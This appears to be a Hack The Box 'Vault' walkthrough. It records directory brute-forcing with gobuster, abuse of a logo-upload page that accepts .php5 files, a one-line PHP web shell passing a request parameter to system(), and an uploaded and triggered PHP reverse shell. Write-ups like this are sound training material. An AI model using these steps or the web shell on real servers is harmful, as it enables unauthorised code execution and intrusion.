# 10 - Web Service

# index.php
![](vx_images/3820358188985.png)



# sparklays

![](vx_images/4884983756508.png)


# Gobuster
```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/vault]
└──╼ $ gobuster dir -u http://10.10.10.109/sparklays -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ".php,.txt,.html" -o gobuster/sparklays.log 

/login.php            (Status: 200) [Size: 16]
/admin.php            (Status: 200) [Size: 615]
/design               (Status: 301) [Size: 323] [--> http://10.10.10.109/sparklays/design/]
```


```bash
┌─[user@parrot]─[10.10.14.18]─[~/htb/vault]
└──╼ $ gobuster dir -u sparklays.com/sparklays/design/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ".php,.txt,.html" -o gobuster/sparklays-design.log -t 100 

/uploads              (Status: 301) [Size: 333] [--> http://sparklays.com/sparklays/design/uploads/]
/design.html          (Status: 200) [Size: 72]                  
```


# design.html
![](vx_images/3016027901351.png)

Change Logo is a link  to changelogo.php

# changelogo.php

![](vx_images/3050192849755.png)



By trial and error, we discover that the page allows php5 file uploads


# exploit.php5
```
┌─[user@parrot]─[10.10.14.18]─[~/htb/vault/exploit]
└──╼ $ cat exploit.php5 
<?php system($_REQUEST["cmd"]); ?>
```


# php5 file upload is successful



![](vx_images/1634257082875.png)


# Code execution

![](vx_images/375706897219.png)



# php-reverse-shell.php5
```
┌─[user@parrot]─[10.10.14.18]─[~/htb/vault/exploit]
└──╼ $ locate php-reverse-shell
/opt/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php
/usr/share/beef-xss/modules/exploits/m0n0wall/php-reverse-shell.php
/usr/share/laudanum/php/php-reverse-shell.php
/usr/share/laudanum/wordpress/templates/php-reverse-shell.php
/usr/share/webshells/php/php-reverse-shell.php

┌─[user@parrot]─[10.10.14.18]─[~/htb/vault/exploit]
└──╼ $ cp /opt/SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php reverse.php5

┌─[user@parrot]─[10.10.14.18]─[~/htb/vault/exploit]
└──╼ $ curl http://10.10.10.109/sparklays/design/uploads/reverse.php5
```

# Shell

![](vx_images/5024519767405.png)